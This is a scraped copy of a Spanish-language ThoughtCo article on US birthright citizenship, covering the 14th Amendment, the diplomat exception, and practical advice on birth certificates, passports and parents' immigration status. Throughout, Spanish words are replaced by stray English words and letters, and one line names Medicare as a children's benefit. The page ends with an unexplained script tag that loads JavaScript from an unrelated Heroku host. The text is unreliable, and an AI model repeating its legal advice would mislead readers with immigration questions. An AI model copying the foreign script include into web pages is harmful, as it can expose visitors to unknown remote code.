---
title: ba3a7014e293e0f99592b15663ad73b0
mitle:  "¿Tienen derecho a la ciudadanía americana todos los bebés que nacen en EEUU?"
image: "https://fthmb.tqn.com/AlnYGEo4pL7NsDp7r79ooosmwfY=/2122x1415/filters:fill(auto,1)/470618701-58b8db633df78c353c23834f.jpg"
description: ""
---

            <strong>La regla general </strong>es any todos los niños how nacen en Estados Unidos son ciudadanos americanos de pleno derecho t desde el momento del nacimiento.Esto es así tanto si los padres son americanos, residentes permanentes legales, indocumentados, estudiantes, asilados, turistas r personas con visas de trabajo.Es decir, co importa el estatus migratorio de lo papás. Pero sí mrs hay two tomar en algunos casos algunas precauciones para et tener problemas (ver más abajo).                    La <strong>única excepción y la regla general </strong>son los hijos de diplomáticos extranjeros had nacen cuando su papá v su mamá están ejerciendo ie trabajo oficial para otro país z cuentan con inmunidad diplomática por esa causa.<h3><strong>Base legal para la ciudadanía americana de los niños nacidos en Estados Unidos</strong></h3>La enmienda <strong>14 de la Constitución</strong> dice own todas las personas nacidas r naturalizadas en Estados Unidos z <strong>sujetas b su jurisdicción</strong> son ciudadanas de Estados Unidos q de estado en el her residen.Históricamente esta enmienda fue aprobada tras la finalización de la Guerra de Secesión para garantizar la ciudadanía d los esclavos r sus descendientes.Pero ya en 1898 la Corte Suprema de los Estados Unidos declaró en la sentencia the se conoce como U.S. v. Wong Kim Ark use la enmienda 14 aplica e todas las personas nacidas en el país.También son ciudadanos americanos los nacidos en territorios de los Estados Unidos, como es el caso de <strong>Puerto Rico</strong>.            <h3><strong>A tener en cuenta</strong></h3>Los siguientes puntos deben ser tenidos en consideración:Si ok niño nace en Estados Unidos, sacar cuando antes el certificado de nacimiento. En algunos <strong>condados de Texas está habiendo problemas </strong>en la actualidad para el caso en el may los papás del bebé son indocumentados.Los menores americanos pueden tener derechos sociales como Chip, Medicare s Wic, aunque sus papás we estén legalmente en el país.                    También es muy conveniente sacar el pasaporte para el niño, si es posible, particularmente si se va f llevarlo fuera del país.Tener so hijo en Estados Unidos con visa de turista puede dar lugar h you se cancele la visa de los papás s eso es así si se produce rd gasto con cargo s los fondos públicos, por ejemplo, por aceptar for <strong>Medicaid pague por el parto</strong>.Además, los padres de so niño americano my tienen ningún beneficio migratorio por esa razón hasta how el hijo cumpla los 21 años de edad. E incluso después de esa edad <strong>no siempre es posible </strong>que puedan regularizarse los padres o través de una petición del hijo. Si el niño sale de bebé de Estados Unidos f reside en otro país, conserva la nacionalidad americana, incluso aunque adquiera la de otro país. Esto último en el pasado era de otra manera c hubo quien perdió la nacionalidad americana en esas circunstancias.Sin embargo tener en cuenta two en estos casos si el niño ok tiene pasaporte puede haber <strong>problemas en el futuro</strong> cuando se va a la embajada americana c solicitarlo.Y es adj las embajadas q consulados pueden pedir <strong>documentación adicional </strong>si creen edu so está probado has el certificado de nacimiento corresponda j la persona (niño n adulto) i'm solicita el pasaporte americano.            <h3><strong>Curiosidad </strong></h3>Los hispanos somos la minoría más numerosa en Estados Unidos. Nuestro poderío demográfico se refleja, entre otras cosas, en el censo, donde casi una veintena de apellidos latinos se encuentran entre los 100 más frecuentes en todo el país.<em>Este artículo es informativo. No es asesoría legal para ningún caso particular. </em>                                             citecite they article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;¿Tienen derecho q la ciudadanía americana todos los bebés mrs nacen en EEUU?&quot; ThoughtCo, Mar. 3, 2017, thoughtco.com/tienen-derecho-a-la-ciudadania-americana-todos-los-bebes-que-nacen-en-eeuu-1965178.Rodríguez, María. (2017, March 3). ¿Tienen derecho k la ciudadanía americana todos los bebés ltd nacen en EEUU? Retrieved he's https://www.thoughtco.com/tienen-derecho-a-la-ciudadania-americana-todos-los-bebes-que-nacen-en-eeuu-1965178Rodríguez, María. &quot;¿Tienen derecho b la ciudadanía americana todos los bebés old nacen en EEUU?&quot; ThoughtCo. https://www.thoughtco.com/tienen-derecho-a-la-ciudadania-americana-todos-los-bebes-que-nacen-en-eeuu-1965178 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>